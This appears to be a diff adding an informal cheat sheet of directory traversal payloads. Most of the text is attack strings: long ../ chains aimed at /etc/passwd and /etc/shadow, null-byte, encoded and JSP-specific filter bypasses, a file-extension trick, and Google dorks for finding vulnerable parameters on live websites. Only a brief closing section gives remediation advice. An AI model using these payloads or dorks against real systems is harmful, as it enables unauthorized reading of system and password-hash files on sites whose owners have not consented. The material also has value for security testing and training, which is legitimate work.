@@ -1,0 +1,71 @@
+Payload:
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+../../../../../etc/shadow - has hashed passwords of linux user acc
+../../../../../etc/hosts - gives respective servers of the given ip
+
+
+Google dorks for directory traversal vulnerabilit :
+For JSP pages replace php with jsp
+inurl: /index.php?page=
+inurl: /index.php?pg=
+inurl: /index.php?show=
+inurl: /index.php?cat=
+inurl: /index.php?file=
+inurl: /index.php?filename=
+inurl: /index.php?site=
+inurl: /index.php?url=
+inurl: /db.php?path_local=
+inurl: /download.php?filename=
+inurl: /download.php?dir=
+
+
+NULL BYTE CHARACTERS:
+
+%00 
+This can be added at the end of any payload to bypass a basic web application filter
+
+Filter bypasser For JSP pages:
+..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd
+
+../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../\etc/\passwd
+
+../\../\../\../\etc/\passwd
+../\../\../\../\etc/\passwd%00
+../\../\../\../\etc/\passwd%00\
+../\../\../\../\etc/\passwd%00\%00
+
+Encoded payloads to bypass filters:
+%2F - /
+%3F - ?
+
+
+..%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2Fetc%2Fpasswd%00
+..%2F\..%2F\..%2F\etc%2F\passwd%00
+..%2F\..%2F\..%2F\etc%2F\passwd%00\%00
+
+two types of url
+
+with file extension
+
+- If the server only accepts limited file extensions like jpg,jpeg etc we can use
+../\../\../\../\etc/\passwd%00.jpg
+use the url with the limited file extensions
+
+
+ 
+doesnt need file extension just retrieves only the file we asked for
+
+
+
+REMEDIAL ACTIONS:
+The website should validate the input parameter or value before processing it, if that’s not possible
+the input values must be filtered first before accepting them.
+After validating it should verify the path before displaying the output
+The permissions must be given so that only the authorized person can gain the access
+Do not use user input to directly call a file
+The data should not be interpreted , it should be emcoded, escaped and cleaned
+
+
+
